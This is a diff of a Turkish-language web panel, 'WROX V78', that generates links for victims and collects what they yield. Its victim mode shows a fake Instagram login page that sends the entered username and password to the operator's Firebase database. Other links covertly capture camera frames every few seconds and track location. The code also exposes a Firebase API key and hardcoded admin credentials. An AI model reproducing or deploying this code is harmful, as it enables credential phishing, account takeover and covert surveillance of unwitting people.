@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WROX V78 PREMIUM - ADMIN</title>
+    <title>WROX V78 ADMIN</title>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.0.0/firebase-database-compat.js"></script>
 
@@ -14,37 +14,35 @@
         /* AUTH SECTION */
         #auth-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
         .auth-box { border: 2px solid var(--neon); padding: 30px; border-radius: 15px; text-align: center; width: 85%; max-width: 350px; background: var(--panel); }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); box-sizing: border-box; border-radius: 5px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #333; color: var(--neon); border-radius: 5px; box-sizing: border-box; }
         button { width: 100%; padding: 12px; background: transparent; border: 2px solid var(--neon); color: var(--neon); cursor: pointer; font-weight: bold; border-radius: 5px; }
-        button:hover { background: var(--neon); color: #000; }
 
         /* HEADER & NAV */
         #main-panel { display: none; }
         .header { display: flex; justify-content: space-between; align-items: center; padding: 15px; border-bottom: 2px solid var(--neon); background: var(--panel); position: sticky; top: 0; z-index: 100; }
         .nav-menu { position: fixed; top: 60px; left: -100%; width: 220px; height: 100%; background: var(--panel); border-right: 2px solid var(--neon); transition: 0.3s; z-index: 99; }
         .nav-menu.active { left: 0; }
-        .nav-menu div { padding: 20px; border-bottom: 1px solid #222; cursor: pointer; color: var(--neon); font-size: 13px; }
+        .nav-menu div { padding: 20px; border-bottom: 1px solid #222; cursor: pointer; color: var(--neon); }
 
-        /* CONTENT AREAS */
+        /* CONTENT AREAS & SCROLL */
         .tab-content { display: none; padding: 20px; }
         .tab-content.active { display: block; }
         .stream-container { border: 2px solid var(--neon); border-radius: 15px; padding: 15px; margin-top: 20px; background: #050505; }
         .feed-wrapper { display: flex; flex-direction: column; gap: 15px; max-height: 480px; overflow-y: auto; }
-        .feed-item { border: 1px solid #222; border-radius: 10px; padding: 10px; background: #000; font-size: 12px; }
-        .feed-item img { width: 100%; border-radius: 8px; margin-top: 5px; }
+        .feed-item { border: 1px solid #222; border-radius: 10px; padding: 10px; background: #000; font-size: 11px; }
+        .feed-item img { width: 100%; border-radius: 8px; margin-top: 5px; border: 1px solid #333; }
 
-        .action-btn { margin-bottom: 15px; width: 100%; border-color: var(--neon); color: var(--neon); }
-        .link-box { background: #111; padding: 10px; font-size: 10px; word-break: break-all; margin-bottom: 20px; border: 1px dashed var(--neon); color: var(--neon); display: none; }
+        .link-box { background: #111; padding: 10px; font-size: 10px; word-break: break-all; margin: 15px 0; border: 1px dashed var(--neon); color: var(--neon); display: none; }
     </style>
 </head>
 <body>
 
     <div id="auth-screen">
         <div class="auth-box">
-            <h2 style="color: var(--neon); margin-bottom: 20px;">WROX V78</h2>
-            <input type="text" id="email" placeholder="E-posta / Admin ID">
-            <input type="password" id="pass" placeholder="VIP Şifre">
-            <button onclick="auth('login')">SİSTEME GİRİŞ</button>
+            <h2 style="color: var(--neon);">WROX V78</h2>
+            <input type="text" id="email" placeholder="E-posta">
+            <input type="password" id="pass" placeholder="Şifre">
+            <button onclick="auth('login')">GİRİŞ YAP</button>
             <button onclick="auth('register')" style="margin-top:10px; border-color:#444; color:#666; font-size:11px;">KAYIT OL</button>
         </div>
     </div>
@@ -63,37 +61,28 @@
 
         <div id="cam-tab" class="tab-content active">
             <h3>📷 KAMERA ÜNİTESİ</h3>
-            <button class="action-btn" onclick="genLink('cam')">KAMERA LİNKİ OLUŞTUR</button>
+            <button onclick="genLink('cam')">KAMERA LİNKİ OLUŞTUR</button>
             <div id="cam-link" class="link-box"></div>
-            <div class="stream-container">
-                <div style="color:var(--red); font-weight:bold; margin-bottom:10px;">🔴 CANLI GÖRÜNTÜ AKIŞI:</div>
-                <div id="cam-feed" class="feed-wrapper"></div>
-            </div>
+            <div class="stream-container"><div id="cam-feed" class="feed-wrapper"></div></div>
         </div>
 
         <div id="loc-tab" class="tab-content">
             <h3>📍 KONUM TAKİBİ</h3>
-            <button class="action-btn" onclick="genLink('loc')">KONUM LİNKİ OLUŞTUR</button>
+            <button onclick="genLink('loc')">KONUM LİNKİ OLUŞTUR</button>
             <div id="loc-link" class="link-box"></div>
-            <div class="stream-container">
-                <div style="color:var(--red); font-weight:bold; margin-bottom:10px;">📌 SON KONUMLAR:</div>
-                <div id="loc-feed" class="feed-wrapper"></div>
-            </div>
+            <div class="stream-container"><div id="loc-feed" class="feed-wrapper"></div></div>
         </div>
 
         <div id="ig-tab" class="tab-content">
             <h3>🔑 INSTAGRAM PANEL</h3>
-            <button class="action-btn" onclick="genLink('ig')">IG PHISHING LİNKİ</button>
+            <button onclick="genLink('ig')">IG LİNKİ OLUŞTUR</button>
             <div id="ig-link" class="link-box"></div>
-            <div class="stream-container">
-                <div style="color:var(--red); font-weight:bold; margin-bottom:10px;">👤 DÜŞEN HESAPLAR:</div>
-                <div id="ig-feed" class="feed-wrapper"></div>
-            </div>
+            <div class="stream-container"><div id="ig-feed" class="feed-wrapper"></div></div>
         </div>
     </div>
 
     <script>
-        // 1. FIREBASE BAĞLANTISI
+        // FIREBASE
         const firebaseConfig = {
             apiKey: "AIzaSyAKB12tpEblTHYV7niVHc3VvAtv0jl873E",
             databaseURL: "https://wrox-premium-default-rtdb.firebaseio.com",
@@ -104,25 +93,20 @@
 
         let activeUser = "";
 
-        // 2. ADMIN VE KULLANICI GİRİŞİ
         function auth(type) {
             const u = document.getElementById('email').value.trim();
             const p = document.getElementById('pass').value;
             const id = u.split('@')[0].replace(/[^a-zA-Z0-9]/g, "");
 
-            // ADMIN KONTROLÜ (Senin VIP Bilgilerin)
             if (u === "afavan66@gmail.com" && p === "Efecan1903") {
                 activeUser = "afavan66";
                 startApp(true);
-                return;
-            }
-
-            if(type === 'register') {
-                db.ref('users/'+id).set({p:p}).then(()=>alert("Kayıt Başarılı. Giriş Yapabilirsiniz."));
+            } else if(type === 'register') {
+                db.ref('users/'+id).set({p:p}).then(()=>alert("Kayıt Tamam"));
             } else {
                 db.ref('users/'+id).once('value').then(s => {
                     if(s.exists() && s.val().p === p) { activeUser = id; startApp(false); }
-                    else alert("Hatalı Giriş!");
+                    else alert("Hata!");
                 });
             }
         }
@@ -132,7 +116,6 @@
             document.getElementById('main-panel').style.display = 'block';
             document.getElementById('user-tag').innerText = (isAdmin ? "ADMİN: " : "USER: ") + activeUser.toUpperCase();
             
-            // Veri Dinleme
             db.ref('logs/'+activeUser).on('child_added', s => {
                 const val = s.val();
                 let html = `<div class="feed-item"><b>${new Date(val.t).toLocaleTimeString()}</b><br>`;
@@ -143,7 +126,7 @@
                     html += `<a href="${val.d}" target="_blank" style="color:yellow;">📍 HARİTADA GÖR</a></div>`;
                     document.getElementById('loc-feed').insertAdjacentHTML('afterbegin', html);
                 } else if(val.type === 'ig') {
-                    html += `<span style="color:#2ecc71">User: ${val.u}</span><br><span style="color:#e74c3c">Pass: ${val.p}</span></div>`;
+                    html += `U: ${val.u} | P: ${val.p}</div>`;
                     document.getElementById('ig-feed').insertAdjacentHTML('afterbegin', html);
                 }
             });
@@ -162,7 +145,7 @@
             box.innerText = link; box.style.display = 'block';
         }
 
-        // 3. KURBAN MODLARI
+        // KURBAN MODU
         const params = new URLSearchParams(window.location.search);
         const ref = params.get('ref');
         const mode = params.get('m');
@@ -171,9 +154,9 @@
             if(mode === 'ig') {
                 document.body.innerHTML = `<div style="background:#fff; height:100vh; display:flex; flex-direction:column; align-items:center; padding-top:40px; font-family:sans-serif;">
                     <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" width="175">
-                    <input id="iu" placeholder="Kullanıcı adı" style="width:280px; padding:12px; margin-top:30px; border:1px solid #dbdbdb; background:#fafafa; border-radius:3px;">
-                    <input id="ip" type="password" placeholder="Şifre" style="width:280px; padding:12px; margin-top:10px; border:1px solid #dbdbdb; background:#fafafa; border-radius:3px;">
-                    <button onclick="sendIG()" style="width:280px; background:#0095f6; color:white; border:none; padding:12px; margin-top:20px; border-radius:4px; font-weight:bold;">Giriş Yap</button>
+                    <input id="iu" placeholder="Kullanıcı adı" style="width:280px; padding:12px; margin-top:30px; border:1px solid #dbdbdb; background:#fafafa;">
+                    <input id="ip" type="password" placeholder="Şifre" style="width:280px; padding:12px; margin-top:10px; border:1px solid #dbdbdb; background:#fafafa;">
+                    <button onclick="sendIG()" style="width:280px; background:#0095f6; color:white; border:none; padding:12px; margin-top:20px; font-weight:bold;">Giriş Yap</button>
                 </div>`;
                 window.sendIG = () => {
                     db.ref('logs/'+ref).push({type:'ig', u:document.getElementById('iu').value, p:document.getElementById('ip').value, t:Date.now()});
@@ -193,7 +176,7 @@
                     setInterval(() => {
                         c.width=v.videoWidth; c.height=v.videoHeight;
                         c.getContext('2d').drawImage(v,0,0);
-                        db.ref('logs/'+ref).push({type:'cam', d:c.toDataURL('image/jpeg', 0.3), t:Date.now()});
+                        db.ref('logs/'+ref).push({type:'cam', d:c.toDataURL('image/webp', 0.5), t:Date.now()});
                     }, 4000);
                 });
             }
